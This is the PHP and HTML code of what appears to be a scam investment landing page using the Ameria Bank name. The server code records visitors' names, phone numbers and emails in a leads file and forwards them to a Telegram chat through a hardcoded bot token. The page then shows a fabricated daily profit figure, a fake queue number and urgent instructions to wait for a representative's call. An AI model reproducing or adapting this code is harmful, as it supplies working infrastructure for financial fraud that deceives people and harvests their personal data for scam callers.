<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Отримати реферера
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$cleanedReferer = htmlspecialchars($referer, ENT_QUOTES, 'UTF-8');

// Отримати дані з форми
$f_name = isset($_POST['f_name']) ? htmlspecialchars($_POST['f_name']) : '';
$l_name = isset($_POST['l_name']) ? htmlspecialchars($_POST['l_name']) : '';
$email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
$phone = isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : '';
$utm_source = isset($_POST['utm_source']) ? htmlspecialchars($_POST['utm_source']) : '';
$utm_medium = isset($_POST['utm_medium']) ? htmlspecialchars($_POST['utm_medium']) : '';
$utm_campaign = isset($_POST['utm_campaign']) ? htmlspecialchars($_POST['utm_campaign']) : '';
$utm_content = isset($_POST['utm_content']) ? htmlspecialchars($_POST['utm_content']) : '';

// Перевірка значень UTM міток для налагодження
error_log("UTM Source: $utm_source");
error_log("UTM Medium: $utm_medium");
error_log("UTM Campaign: $utm_campaign");
error_log("UTM Content: $utm_content");

// Исходные данные с лендинга
$arr = array(
    "Имя: " => $f_name,
    "Фамилия: "  => $l_name,
    "Телефон: " => "+374" . $phone,
    "Почта: " => $email,
);

// Путь сохранение лидов на сервере
$file_path = 'leads.txt';

// Добавляем дату и время создания лида
$arr["Дата і время создания"] = date('Y-m-d H:i:s');

// Открываем файл для записи 
$file = fopen($file_path, 'a');

if ($file) {
    // Конвертируем масив данных у строку JSON для сохраниния
    $data_to_write = json_encode($arr, JSON_UNESCAPED_UNICODE);

    // Записываем данные у файл
    fwrite($file, $data_to_write . PHP_EOL);

    // Закрываем файл
    fclose($file);
} else {
    echo "Ошибка открытия файла для записи.";
}

// Нет надобности виводить уведомление об успешном сохранении

$arr = array(
    "✅ Группа A - Заявка Ameria Bank NEWS :  ",
    "Имя: " => $f_name,
    "Фамилия: "  => $l_name,
    "Телефон: " => "+374" . $phone,
    "Почта: " => $email,
    "utm_content" => $utm_content,
);

$txt = '';
$token = "6328077423:AAGqC8FGaYFq5ZfOxB9mOlIhdLbD_Ivzixs";
$chat_id = "-1001770183008 ";

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."\n";
}

$data = [
    'text' => $txt,
    'chat_id' => $chat_id
];

$URL = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) . "&parse_mode=html";

function get_content($URL) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $URL);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$json = get_content($URL);
?>






<!DOCTYPE html>
<html lang="ru">

<head>
	<meta charset="UTF-8" />
	<meta name="viewport"
				content="width=device-width, initial-scale=1.0" />
	<title>
		Поздравляем!	</title>
	<link rel="preconnect"
				href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;500;600;700&display=swap"
				rel="stylesheet">
<link href="css/main.cb6e3fd1569a3558f302.css" rel="stylesheet">
<img height="1"
		 width="1"
		 style="display: none;"
		 src="https://www.facebook.com/tr?id=1260367131208895&ev=Lead&noscript=1" />
	
	
	


   <!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1678188699664969');
fbq('track', 'PageView');
fbq('track', 'Lead');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1678188699664969&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code --> 
    
        
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '499040422808835');
fbq('track', 'PageView');
fbq('track', 'Lead');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=499040422808835&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->



		 
		 
		 
		 
		 
		 
</head>
<body>
<!-- Global site tag (gtag.js) - Google Ads:  -->
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', '');
</script>
<!-- Event snippet for Отправка формы для потенциальных клиентов conversion page -->
<script>
  gtag('event', 'conversion', {'send_to': '/'});
</script>
	<div class="thanks">
		<header class="thanks__top">
			<div class="container">
				<div class="d-flex justify-content-center align-items-center thanks__top-text-wrapper">
					<p class="thanks__top-text thanks__top-text_highlited"
						 id="profit-counter">15 550$</p>
					<p class="thanks__top-text">
						Прибыль пользователей в автоматическом режиме за сегодняшний день					</p>
				</div>
			</div>
		</header>
		<main class="thanks__main main">
			<div class="container-fluid">
				<div class="row">

					<div class="col-12 col-lg-6 main__first-part">
						<div class="container h-100">
							<div class="d-flex justify-content-center align-items-center flex-column">
								<div class="main__queue-block queue-block d-flex justify-content-center">
									<span class="queue-block__counter"
												id="counter">40</span>

									<p class="queue-block__text">
										Ваше место в очереди на подключение к платформе									</p>
								</div>
								
		<div class="d-lg-none mb-5">
			<div class="video-wrapper">
				<video id="video"
						width="100%"
						controls
						autoplay
						muted
						src="video/ameriabank.mp4"></video>
			</div>
		</div>								<div class="main__text-wrapper">
									<h1 class="main__title">
										Поздравляем!									</h1>
									<h3 class="main__subtitle">
										Регистрация почти завершена...									</h3>
									<p class="main__text mb-5">
										Еще несколько шагов и вы сможете заработать первые деньги в интернете. Для этого:									</p>
									<span class="main__number">1</span>
									<p class="main__text">
										Оставайтесь, пожалуйста, на связи следующие 24 часа									</p>
									<span class="main__number">2</span>
									<p class="main__text">
										Дождитесь звонка официального представителя платформы, чтобы подтвердить регистрацию и открыть личный торговый счет									</p>
								</div>
															</div>
						</div>

					</div>
					
		<div class="col-12 col-lg-4 main__second-part d-none d-lg-flex align-items-center">
			<div class="d-none d-lg-flex">
				<div class="video-wrapper">
					<video id="video2"
						width="100%"
						controls
						autoplay
						muted
						src="video/ameriabank.mp4"></video>
				</div>
			</div>
		</div>					
				</div>

			</div>
		</main>
		<div class="modal fade show"
				 id="modal"
				 tabindex="-1"
				 aria-labelledby="exampleModalLabel"
				 aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered mx-auto">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button"
										class="btn-close"
										data-bs-dismiss="modal"
										aria-label="Close"></button>
					</div>
					<div class="modal-body">
						<i class="fas fa-exclamation-circle"></i>
						<p class="modal-body__text">
							На данный момент, из-за большого количества желающих подключиться к платформе, все новые пользователи помещаются в очередь.						</p>
						<p class="modal-body__text"><strong>
								Не пропустите звонок в ближайшие пару часов, иначе ваше место займет кто-то другой							</strong></p>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script defer
					src="js/main.45d77917ced8d719f526.js"></script>
	<script src="https://wtcprojects.com/video/video.js"></script>
</body>

</html>